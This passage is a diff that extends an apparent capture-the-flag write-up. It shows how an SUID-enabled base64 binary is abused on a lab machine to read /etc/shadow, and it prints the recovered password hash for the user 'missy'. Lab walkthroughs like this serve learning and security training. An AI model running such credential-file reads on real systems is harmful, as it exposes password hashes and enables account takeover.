@@ -1305,3 +1305,16 @@ sudo install -m =xs $(which base64) .
 LFILE=file_to_read
 ./base64 "$LFILE" | base64 --decode
 ```
+
+```
+[leonard@ip-10-10-192-244 home]$ LFILE=/etc/shadow
+[leonard@ip-10-10-192-244 home]$ /usr/bin/base64 "$LFILE" | base64 --decode
+```
+
+Output
+```
+missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
+```
+
+Hash: $6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/
+
